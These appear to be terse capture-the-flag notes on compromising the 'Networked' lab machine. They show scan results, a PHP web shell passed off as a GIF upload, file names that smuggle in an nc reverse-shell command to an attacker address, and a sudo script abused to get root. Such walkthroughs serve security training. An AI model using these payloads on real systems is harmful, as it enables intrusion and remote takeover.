----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Networked
# 15/3/2023
10.10.10.146

----------------------------------------------------
# nmap
----------------------------------------------------
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
443/tcp closed https

----------------------------------------------------
# gobuster
----------------------------------------------------
gobuster dir -u http://10.10.10.146 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 40 -x .php 
/uploads              (Status: 301) [Size: 236] [--> http://10.10.10.146/uploads/]
/index.php            (Status: 200) [Size: 229]
/photos.php           (Status: 200) [Size: 1302]
/upload.php           (Status: 200) [Size: 169]
/lib.php              (Status: 200) [Size: 0]
/backup               (Status: 301) [Size: 235] [--> http://10.10.10.146/backup/]



----------------------------------------------------
# exploitation
----------------------------------------------------
└─$ nano shell.php
<?php system($_GET["cmd"]);?>


addmagic byte and extentiong as gif GIF8;
then upload to /upload.php 

then go to /photos.php 

and call the shell
http://10.10.10.146//uploads/10_10_16_2.php.gif?cmd=id

bingo code execution

got a shell

----------------------------------------------------
# priv esc
----------------------------------------------------
now
└─$ nc -lvnp 9001 
cd /var/www/html/uploads
touch -- ';nc -c bash 10.10.16.2 9001;.php'
or 
touch '; nc 10.10.16.2 8888 -c bash'

we have guly's shell
[guly@networked ~]$ sudo -l
    (root) NOPASSWD: /usr/local/sbin/changename.sh


for root
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
sudo /usr/local/sbin/changename.sh
interface NAME:
scientist
scientist
interface PROXY_METHOD:
noob
noob
interface BROWSER_ONLY:
yes                                                                                                                 
yes                                                                                                                 
interface BOOTPROTO:                                                                                                
TCP bash  

and we got root
GG!
